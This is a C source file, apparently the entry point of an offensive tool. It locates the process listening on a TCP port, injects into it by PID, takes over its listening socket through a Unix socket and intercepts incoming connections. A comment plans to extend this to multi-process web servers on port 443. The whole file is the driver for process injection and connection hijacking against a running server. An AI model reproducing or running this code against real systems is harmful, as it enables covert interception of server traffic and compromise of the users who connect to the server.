#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>

#include "utils/envs.h"
#include "injection/injector.h"
#include "connection_management.h"
#include "./utils/identify_listening_process_details.h"
#include "./utils/unix_socket.h"

/*
 * =============
 *  Known Issue
 * =============
 *
 * Currently the server can only attach to a single process. Meaning that this won't work on
 * web servers that use multiple processes.
 *
 * To fix this we just need to find all the pids that are listening on port 443 (easy fix to the identify stage)
 * For each of the processes run the logic in main
 */

int main() {
    /*
     *  Disable buffering for stdout so all prints to stdout don't need to be flushed afterwards
     */
    setvbuf(stdout, NULL, _IONBF, 0);


    printf("[Process main] Looking for process listening on TCP port %d...\n", PORT);

    int unix_socket_fd = initiate_unix_socket();

    fd_details * listening_socket_details = (fd_details*) calloc(1, sizeof(fd_details));

    if (!listening_socket_details) {
        fprintf(stderr, "[Process main] Failed to allocate listening_socket_details\n");
        return -1;
    }

    if (identify_listening_process_details(PORT, listening_socket_details) != 0) {
        fprintf(stderr, "[Process main] Web server identification failed\n");
        return -1;
    }

    printf("[Process main] Found listening socket inode: %lu\n", listening_socket_details->inode);

    if (inject(listening_socket_details->pid) != 0) {
        fprintf(stderr, "[Process main] Injection failed\n");
        return -1;
    }

    const int injection_connection_fd = listen_to_unix_socket(unix_socket_fd);

    const int listening_fd = initiate_connection(injection_connection_fd, listening_socket_details->fd);

    intercept_connections(listening_fd, injection_connection_fd);

    return 0;
}
